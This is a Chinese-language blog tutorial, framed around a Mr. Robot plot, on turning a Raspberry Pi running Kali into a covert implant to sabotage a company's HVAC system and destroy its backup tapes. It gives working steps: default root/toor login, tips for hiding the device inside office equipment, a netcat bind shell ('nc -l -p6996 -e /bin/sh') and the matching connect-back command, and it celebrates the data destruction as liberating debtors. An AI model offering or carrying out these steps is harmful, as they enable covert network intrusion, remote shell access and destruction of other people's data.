  <p class="graf graf--p">
   Mr. Robot 中最有趣的部分就在于黑客行为主义操作非常真实，几乎每一步都是如此。
  </p>
  <p class="graf graf--p">
   在第4季中，Elliott 计划使用树莓派控制邪恶公司正在存储其磁带备份的存储室的加热系统（暖通空调HVAC系统）。如果可以在存储室中充分升高温度，就能造成这些磁带备份无法再使用，也就是毁掉邪恶公司的所有数据。
  </p>
  <p class="graf graf--p">
   在这些磁带备份上记录了全世界70％的消费者债务，包括数十亿美元的学生贷款。
  </p>
  <p class="graf graf--p">
   黑客们相信，只要销毁所有这些记录，那么数百万人就可以解放了 —— 摆脱邪恶公司的债务陷阱。
  </p>

  <h3 class="graf graf--p">
   <strong class="markup--strong markup--p-strong">
    第一步：下载ARM版本的Kali
   </strong>
  </h3>
  <p class="graf graf--p">
   当然，第一步是下载。 Raspberry Pi 和许多移动设备使用 ARM CPU，因为它们更节能更酷，因此必须专门为其编译 Kali 操作系统。幸运的是已经有人帮您做好了。
  </p>

  <h3 class="graf graf--p">
   <strong class="markup--strong markup--p-strong">
    第二步：下载并安装 Win32 Disk Imager
   </strong>
  </h3>
  <p class="graf graf--p">
   现在需要安装 Win32 Disk Imager，您可以
   <a class="markup--anchor markup--p-anchor" data-href="http://sourceforge.net/projects/win32diskimager/" href="https://sourceforge.net/projects/win32diskimager/" rel="noopener noreferrer" target="_blank">
    从 SourceForge 下载
   </a>
   。
  </p>
  <p class="graf graf--p">
   该工具使您能够将映像写入SD卡或USB驱动器。建议使用至少4GB的快速SD卡。您现在可以以约7美元的价格购买16GB。
  </p>
  <h3 class="graf graf--p">
   <strong class="markup--strong markup--p-strong">
    第三步：运行磁盘映像
   </strong>
  </h3>
  <p class="graf graf--p">
   现在，您已经安装了 Disk Imager，右键单击它并以 “管理员” 身份运行它。
  </p>
  <p class="graf graf--p">
   <img alt="" class="aligncenter size-full wp-image-12763 jetpack-lazy-image" data-lazy-src="https://i2.wp.com/www.iyouport.org/wp-content/uploads/2020/02/2-1.jpg?resize=289%2C228&amp;is-pending-load=1#038;ssl=1" data-recalc-dims="1" height="228" src="https://i2.wp.com/www.iyouport.org/wp-content/uploads/2020/02/2-1.jpg?resize=289%2C228&amp;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" width="289"/>
   <noscript>
    <img alt="" class="aligncenter size-full wp-image-12763" data-recalc-dims="1" height="228" src="https://i2.wp.com/www.iyouport.org/wp-content/uploads/2020/02/2-1.jpg?resize=289%2C228&amp;ssl=1" width="289"/>
   </noscript>
  </p>
  <p class="graf graf--p">
   在 “Image File” 窗口中选择 Kali 映像，在 “设备” 窗口中将映像定向到SD卡，然后单击 “写入” 按钮。请耐心等待，这可能需要一些时间。
  </p>
  <p class="graf graf--p">
   <img alt="" class="aligncenter size-full wp-image-12764 jetpack-lazy-image" data-lazy-sizes="(max-width: 415px) 100vw, 415px" data-lazy-src="https://i1.wp.com/www.iyouport.org/wp-content/uploads/2020/02/3-1.jpg?resize=415%2C204&amp;is-pending-load=1#038;ssl=1" data-lazy-srcset="https://i1.wp.com/www.iyouport.org/wp-content/uploads/2020/02/3-1.jpg?w=415&amp;ssl=1 415w, https://i1.wp.com/www.iyouport.org/wp-content/uploads/2020/02/3-1.jpg?resize=300%2C147&amp;ssl=1 300w" data-recalc-dims="1" height="204" src="https://i1.wp.com/www.iyouport.org/wp-content/uploads/2020/02/3-1.jpg?resize=415%2C204&amp;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" width="415"/>
   <noscript>
    <img alt="" class="aligncenter size-full wp-image-12764" data-recalc-dims="1" height="204" sizes="(max-width: 415px) 100vw, 415px" src="https://i1.wp.com/www.iyouport.org/wp-content/uploads/2020/02/3-1.jpg?resize=415%2C204&amp;ssl=1" srcset="https://i1.wp.com/www.iyouport.org/wp-content/uploads/2020/02/3-1.jpg?w=415&amp;ssl=1 415w, https://i1.wp.com/www.iyouport.org/wp-content/uploads/2020/02/3-1.jpg?resize=300%2C147&amp;ssl=1 300w" width="415"/>
   </noscript>
  </p>
  <p class="graf graf--p">
   如果您使用 Linux，事情会更简单。无需下载任何内容。您只需使用
   <strong class="markup--strong markup--p-strong">
    dd
   </strong>
   命令（dd 命令也用于在数字取证中创建磁盘映像）。
  </p>
  <p class="graf graf--p">
   如果假设该映像名为 Kali-RPI.img 且 SD 卡位于
   <em class="markup--em markup--p-em">
    /dev/sdc
   </em>
   并希望以512k块大小（bs）复制，则只需键入：
  </p>
  <p class="graf graf--p">
   <strong class="markup--strong markup--p-strong">
    kali &gt;dd if =Kali-RPI.img of = /dev/sdc bs=512k
   </strong>
  </p>
  <h3 class="graf graf--p">
   <strong class="markup--strong markup--p-strong">
    第四步：在 Raspberry Pi 中安装SD卡
   </strong>
  </h3>
  <p class="graf graf--p">
   现在需要从您的PC上卸下SD卡，然后将SD卡安装到树莓派中并启动它。
  </p>
  <p class="graf graf--p">
   启动时，将带您到命令行打开窗口，询问您的用户名和密码。输入：
  </p>
  <p class="graf graf--p">
   <strong class="markup--strong markup--p-strong">
    username: root
   </strong>
   <br/>
   <strong class="markup--strong markup--p-strong">
    password: toor
   </strong>
  </p>
  <p class="graf graf--p">
   然后输入：
  </p>
  <p class="graf graf--p">
   <strong class="markup--strong markup--p-strong">
    kali &gt; startx
   </strong>
  </p>
  <p class="graf graf--p">
   这将启动Kali的X11 GUI。成功！现在，您有了一个微型 Kali 黑客工具，可以将其放在任何地方！
  </p>
  <h3 class="graf graf--p">
   <strong class="markup--strong markup--p-strong">
    第五步：在树莓派上启动 Cryptcat 侦听器
   </strong>
  </h3>
  <p class="graf graf--p">
   现在，有了运行 Kali 的 Raspberry Pi，可以将其放置在邪恶公司网络中的​​任何位置。Raspberry Pi 具有以太网连接，您可以添加无线适配器。
  </p>
  <p class="graf graf--p">
   👉Raspberry Pi 非常小，可以隐藏在许多地方 —— 包括台式计算机内部，电话内部，时钟内部等，而不会引起注意。
  </p>
  <p class="graf graf--p">
   <img alt="" class="aligncenter size-full wp-image-12765 jetpack-lazy-image" data-lazy-sizes="(max-width: 1057px) 100vw, 1057px" data-lazy-src="https://i0.wp.com/www.iyouport.org/wp-content/uploads/2020/02/5.jpg?resize=1057%2C1078&amp;is-pending-load=1#038;ssl=1" data-lazy-srcset="https://i0.wp.com/www.iyouport.org/wp-content/uploads/2020/02/5.jpg?w=1057&amp;ssl=1 1057w, https://i0.wp.com/www.iyouport.org/wp-content/uploads/2020/02/5.jpg?resize=294%2C300&amp;ssl=1 294w, https://i0.wp.com/www.iyouport.org/wp-content/uploads/2020/02/5.jpg?resize=1004%2C1024&amp;ssl=1 1004w, https://i0.wp.com/www.iyouport.org/wp-content/uploads/2020/02/5.jpg?resize=768%2C783&amp;ssl=1 768w" data-recalc-dims="1" height="1078" src="https://i0.wp.com/www.iyouport.org/wp-content/uploads/2020/02/5.jpg?resize=1057%2C1078&amp;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" width="1057"/>
   <noscript>
    <img alt="" class="aligncenter size-full wp-image-12765" data-recalc-dims="1" height="1078" sizes="(max-width: 1057px) 100vw, 1057px" src="https://i0.wp.com/www.iyouport.org/wp-content/uploads/2020/02/5.jpg?resize=1057%2C1078&amp;ssl=1" srcset="https://i0.wp.com/www.iyouport.org/wp-content/uploads/2020/02/5.jpg?w=1057&amp;ssl=1 1057w, https://i0.wp.com/www.iyouport.org/wp-content/uploads/2020/02/5.jpg?resize=294%2C300&amp;ssl=1 294w, https://i0.wp.com/www.iyouport.org/wp-content/uploads/2020/02/5.jpg?resize=1004%2C1024&amp;ssl=1 1004w, https://i0.wp.com/www.iyouport.org/wp-content/uploads/2020/02/5.jpg?resize=768%2C783&amp;ssl=1 768w" width="1057"/>
   </noscript>
  </p>
  <p class="graf graf--p">
   连接后，可以通过键入以下内容来启动 Netcat 侦听器（Kali 内置了 Netcat）：
  </p>
  <p class="graf graf--p">
   <strong class="markup--strong markup--p-strong">
    kali &gt; nc -l -p6996 -e /bin/sh
   </strong>
  </p>
  <p class="graf graf--p">
   <img alt="" class="aligncenter size-full wp-image-12766 jetpack-lazy-image" data-lazy-sizes="(max-width: 543px) 100vw, 543px" data-lazy-src="https://i2.wp.com/www.iyouport.org/wp-content/uploads/2020/02/6.jpg?resize=543%2C43&amp;is-pending-load=1#038;ssl=1" data-lazy-srcset="https://i2.wp.com/www.iyouport.org/wp-content/uploads/2020/02/6.jpg?w=543&amp;ssl=1 543w, https://i2.wp.com/www.iyouport.org/wp-content/uploads/2020/02/6.jpg?resize=300%2C24&amp;ssl=1 300w" data-recalc-dims="1" height="43" src="https://i2.wp.com/www.iyouport.org/wp-content/uploads/2020/02/6.jpg?resize=543%2C43&amp;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" width="543"/>
   <noscript>
    <img alt="" class="aligncenter size-full wp-image-12766" data-recalc-dims="1" height="43" sizes="(max-width: 543px) 100vw, 543px" src="https://i2.wp.com/www.iyouport.org/wp-content/uploads/2020/02/6.jpg?resize=543%2C43&amp;ssl=1" srcset="https://i2.wp.com/www.iyouport.org/wp-content/uploads/2020/02/6.jpg?w=543&amp;ssl=1 543w, https://i2.wp.com/www.iyouport.org/wp-content/uploads/2020/02/6.jpg?resize=300%2C24&amp;ssl=1 300w" width="543"/>
   </noscript>
  </p>
  <p class="graf graf--p">
   这将使 Elliott 可以使用端口 6996 从任何地方连接到树莓派上的终端。
  </p>
  <p class="graf graf--p">
   现在，Elliott 可以通过在他的 Kali 系统上使用 Netcat 连接回 Raspberry Pi，输入以下内容：
  </p>
  <p class="graf graf--p">
   <strong class="markup--strong markup--p-strong">
    kali &gt; nc 192.168.1.105 6996
   </strong>
  </p>
  <p class="graf graf--p">
   <img alt="" class="aligncenter size-full wp-image-12767 jetpack-lazy-image" data-lazy-sizes="(max-width: 677px) 100vw, 677px" data-lazy-src="https://i1.wp.com/www.iyouport.org/wp-content/uploads/2020/02/7.jpg?resize=677%2C395&amp;is-pending-load=1#038;ssl=1" data-lazy-srcset="https://i1.wp.com/www.iyouport.org/wp-content/uploads/2020/02/7.jpg?w=677&amp;ssl=1 677w, https://i1.wp.com/www.iyouport.org/wp-content/uploads/2020/02/7.jpg?resize=300%2C175&amp;ssl=1 300w" data-recalc-dims="1" height="395" src="https://i1.wp.com/www.iyouport.org/wp-content/uploads/2020/02/7.jpg?resize=677%2C395&amp;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" width="677"/>
   <noscript>
    <img alt="" class="aligncenter size-full wp-image-12767" data-recalc-dims="1" height="395" sizes="(max-width: 677px) 100vw, 677px" src="https://i1.wp.com/www.iyouport.org/wp-content/uploads/2020/02/7.jpg?resize=677%2C395&amp;ssl=1" srcset="https://i1.wp.com/www.iyouport.org/wp-content/uploads/2020/02/7.jpg?w=677&amp;ssl=1 677w, https://i1.wp.com/www.iyouport.org/wp-content/uploads/2020/02/7.jpg?resize=300%2C175&amp;ssl=1 300w" width="677"/>
   </noscript>
  </p>
  <p class="graf graf--p">
   当他键入
   <strong class="markup--strong markup--p-strong">
    ifconfig
   </strong>
   时，可以看到在 Raspberry Pi 上已经有一个终端，准备好对邪恶公司的 HVAC 系统进行入侵了。确保在您的环境中使用 Raspberry Pi 的 IP 地址。
  </p>
  <p class="graf graf--p">
   当然，还有其他方法可以连接回树莓派。他可以使用 SSH，并且如果需要 GUI，安装VNC服务器并通过 Kali 的完全GUI控制连接回去。
  </p>
  <h3 class="graf graf--p">
   <strong class="markup--strong markup--p-strong">
    最后
   </strong>
  </h3>
  <p class="graf graf--p">
   就是这样。现在 Elliott 完全可以控制HVAC系统并调高温度，以熔化备用磁带。数据毁了，所有债务都消失了，人民解放了。
  </p>

   <noscript>
    <img alt="" class="aligncenter size-full wp-image-12915" data-recalc-dims="1" height="1278" sizes="(max-width: 1040px) 100vw, 1040px" src="https://i0.wp.com/www.iyouport.org/wp-content/uploads/2020/07/unnamed-file.png?resize=1040%2C1278&amp;ssl=1" srcset="https://i0.wp.com/www.iyouport.org/wp-content/uploads/2020/07/unnamed-file.png?w=1040&amp;ssl=1 1040w, https://i0.wp.com/www.iyouport.org/wp-content/uploads/2020/07/unnamed-file.png?resize=244%2C300&amp;ssl=1 244w, https://i0.wp.com/www.iyouport.org/wp-content/uploads/2020/07/unnamed-file.png?resize=833%2C1024&amp;ssl=1 833w, https://i0.wp.com/www.iyouport.org/wp-content/uploads/2020/07/unnamed-file.png?resize=768%2C944&amp;ssl=1 768w" width="1040"/>
